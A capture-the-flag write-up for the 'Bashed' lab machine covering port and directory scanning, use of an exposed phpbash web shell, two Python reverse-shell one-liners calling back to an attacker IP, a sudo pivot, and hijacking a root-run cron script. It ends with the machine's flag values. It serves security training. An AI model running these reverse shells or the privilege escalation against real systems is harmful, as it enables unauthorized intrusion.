# Bashed - Easy

```shell
nmap -T4 -A -Pn 10.10.10.68

feroxbuster -u http://10.10.10.68 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

#in /dev/phpbash.php
id

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#get reverse shell by setting up listener in attacker machine

python3 -c 'import pty;pty.spawn("/bin/bash")'

#get user flag

sudo -l

sudo -u scriptmanager bash -i

cd /scripts

ls -la

cat test.py

cat test.txt

#edit test.py
echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' > test.py

#setup listener
nc -nvlp 5555

#we will get root shell
```

```markdown
Open ports & services:

  * 80 - http - Apache httpd 2.4.18 (Ubuntu)

We can check the webpage and simultaneously scan for web directories.

We are given a link to phpbash, a web shell as a replacement for reverse shells.

We just need to drop phpbash.php file on target.

After a while, going through the results of the directories enumerated, we find a /dev directory.

/dev includes phpbash.php, which gives us an interactive shell within the browser.

We get shell in browser as www-data; we can get user flag.

We need to check for privesc now.

By 'sudo -l', we can check that we can commands as 'scriptmanager'.

So, we can switch to this user using 'bash -i'

Now, there is a directory in root named scripts, which contains files test.py and test.txt

Now, test.py is executed every minute, because using 'ls -la', we can see that the timestamp keeps changing for test.txt

By adding python reverse shell code to test.py, and setting up a listener in our machine, we can get root shell.
```

1. User flag - 38324f17c1b7f1deffdc6ae3b0b4581b

2. Root flag - f09037af6b7a59ce7dd57053225f15e2
